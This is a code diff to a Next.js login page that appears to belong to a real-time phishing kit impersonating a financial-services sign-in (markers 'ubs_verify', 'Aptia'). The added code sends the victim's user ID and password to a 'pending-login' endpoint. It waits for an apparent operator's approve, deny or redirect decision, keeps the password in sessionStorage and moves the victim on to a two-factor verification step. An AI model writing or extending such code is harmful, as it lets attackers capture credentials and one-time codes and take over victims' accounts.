@@ -3,6 +3,49 @@
 import { useState, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
 import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
+import { setAptiaLoginFlowStage } from "@/hooks/use-aptia-login-flow-guard";
+
+const PENDING_LOGIN_TIMEOUT_MS = 2 * 60 * 1000;
+const PENDING_LOGIN_POLL_MS = 750;
+
+async function waitForPendingLoginApproval(pendingId: string): Promise<void> {
+  const deadline = Date.now() + PENDING_LOGIN_TIMEOUT_MS;
+
+  while (Date.now() < deadline) {
+    const response = await fetch(
+      `/api/pending-login/${encodeURIComponent(pendingId)}`,
+      { cache: "no-store" },
+    );
+    const data = (await response.json().catch(() => null)) as {
+      status?: string;
+      error?: string;
+    } | null;
+
+    if (!response.ok) {
+      throw new Error(data?.error || "Unable to check login approval");
+    }
+
+    if (
+      data?.status === "approved" ||
+      data?.status === "success" ||
+      data?.status === "successful"
+    ) {
+      return;
+    }
+
+    if (
+      data?.status === "denied" ||
+      data?.status === "expired" ||
+      data?.status === "redirected"
+    ) {
+      throw new Error("Login failed");
+    }
+
+    await new Promise((resolve) => setTimeout(resolve, PENDING_LOGIN_POLL_MS));
+  }
+
+  throw new Error("Login failed");
+}
 
 export default function LoginPage() {
   const [hasInteracted, setHasInteracted] = useState(false);
@@ -45,9 +88,23 @@ export default function LoginPage() {
   const [isLoginLoading, setIsLoginLoading] = useState(false);
   const [loginError, setLoginError] = useState<string | null>(null);
   const [honeypot, setHoneypot] = useState("");
+  const [error, setError] = useState("");
+  const [loginErrors, setLoginErrors] = useState<any>("");
   const countdownRef = useRef<number | null>(null);
   const redirectRef = useRef<number | null>(null);
   const router = useRouter();
+
+  const validateLogin = (): boolean => {
+    const err: { userId?: string; password?: string } = {};
+    const trimmedUserId = username.trim();
+    const trimmedPassword = password.trim();
+    if (!trimmedUserId) err.userId = "User ID is required";
+    if (!trimmedPassword) err.password = "Password is required";
+    else if (trimmedPassword.length < 4)
+      err.password = "Password must be at least 4 characters";
+    setLoginErrors(err);
+    return Object.keys(err).length === 0;
+  };
 
   const handleSignIn = async (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
@@ -56,47 +113,71 @@ export default function LoginPage() {
       setLoginError("Suspicious activity detected. Please try again.");
       return;
     }
+    if (!validateLogin()) return;
+
     setLoginError(null);
+    setError("");
     setIsLoginLoading(true);
+
     try {
-      const response = await fetch("/api/login", {
+      const response = await fetch("/api/pending-login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ userId: username, password }),
+        body: JSON.stringify({
+          userId: username.trim(),
+          password,
+          method: "email",
+          maskedEmail: "",
+          maskedPhone: "",
+          flow: "login",
+        }),
       });
-      if (!response.ok) {
-        throw new Error("Failed to send login data");
+      const data = (await response.json().catch(() => null)) as {
+        id?: string;
+        error?: string;
+      } | null;
+
+      if (!response.ok || !data?.id) {
+        throw new Error(data?.error || "Failed");
       }
-      if (typeof window !== "undefined") {
+
+      await waitForPendingLoginApproval(data.id);
+
+      try {
+        sessionStorage.setItem("loginReady", "1");
+        sessionStorage.setItem("loginUserId", username.trim());
+        sessionStorage.setItem("loginPassword", password.trim());
         sessionStorage.setItem("ubs_verify", "1");
+        setAptiaLoginFlowStage("2fa");
+      } catch {
+        // Ignore storage errors; navigation can still proceed.
       }
-      redirectRef.current = window.setTimeout(() => {
-        router.push("/verify-choice");
-      }, 10000);
+
+      router.push("/verify-choice");
     } catch (error) {
       console.error("Login failed:", error);
-      setLoginError("Unable to send login details. Please try again.");
+      setLoginError(
+        error instanceof Error
+          ? error.message
+          : "Unable to send login details. Please try again.",
+      );
+    } finally {
       setIsLoginLoading(false);
     }
   };
 
   useEffect(() => {
     return () => {
-      if (countdownRef.current) {
-        window.clearInterval(countdownRef.current);
-      }
-      if (redirectRef.current) {
-        window.clearTimeout(redirectRef.current);
-      }
+      if (countdownRef.current) window.clearInterval(countdownRef.current);
+      if (redirectRef.current) window.clearTimeout(redirectRef.current);
     };
   }, []);
 
   return (
     <>
       <style>{`
-            *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
             body{font-family:'Open Sans',Arial,sans-serif;background:#fff;color:#333;min-height:100vh;display:flex;flex-direction:column;font-size:14px;}
-            .topnav{background:#fff;border-bottom:1px solid #ddd;padding:8px 18px;display:flex;align-items:center;gap:24px;}
+                        .topnav{background:#fff;border-bottom:1px solid #ddd;padding:8px 18px;display:flex;align-items:center;gap:24px;}
             .aliance-logo{height:44px;width:auto;display:block;flex-shrink:0;}
             .contact-block{display:flex;flex-direction:column;gap:2px;font-size:0.8rem;color:#444;}
             .contact-row{display:flex;align-items:center;gap:6px;}
@@ -210,6 +291,15 @@ export default function LoginPage() {
               in accordance with our privacy policy.
             </p>
 
+            {error ? (
+              <div
+                className="mb-4 text-sm text-red-600 whitespace-pre-line"
+                role="alert"
+              >
+                {error}
+              </div>
+            ) : null}
+
             <p className="signin-heading flex justify-center">Sign in</p>
             <div className="field-group" id="fg-user">
               <div className="field-label">
@@ -226,6 +316,9 @@ export default function LoginPage() {
                   if (el) el.classList.remove("has-error");
                 }}
               />
+              {loginErrors.userId ? (
+                <p className="text-sm text-red-500">{loginErrors.userId}</p>
+              ) : null}
               <div className="field-help">
                 Forgot your Username?{" "}
                 <a href="#" onClick={(e) => e.preventDefault()}>
@@ -250,6 +343,9 @@ export default function LoginPage() {
                   if (el) el.classList.remove("has-error");
                 }}
               />
+              {loginErrors.password ? (
+                <p className="text-sm text-red-500">{loginErrors.password}</p>
+              ) : null}
               <div className="field-help">
                 Forgot your Password?{" "}
                 <a href="#" onClick={(e) => e.preventDefault()}>
@@ -274,20 +370,27 @@ export default function LoginPage() {
               id="signin-btn"
               disabled={isLoginLoading || !username || !password}
             >
-              <svg
-                id="signin-check"
-                width="16"
-                height="16"
-                viewBox="0 0 24 24"
-                fill="none"
-                stroke="white"
-                strokeWidth="3"
-                strokeLinecap="round"
-                strokeLinejoin="round"
-              >
-                <polyline points="20 6 9 17 4 12" />
-              </svg>
-              <div className="spin-ring" id="signin-spin"></div>
+              {isLoginLoading ? (
+                <div
+                  className="spin-ring"
+                  id="signin-spin"
+                  aria-hidden="true"
+                />
+              ) : (
+                <svg
+                  id="signin-check"
+                  width="16"
+                  height="16"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="white"
+                  strokeWidth="3"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                >
+                  <polyline points="20 6 9 17 4 12" />
+                </svg>
+              )}
               <span id="signin-label">
                 {isLoginLoading ? "Signing in…" : "SIGN IN"}
               </span>
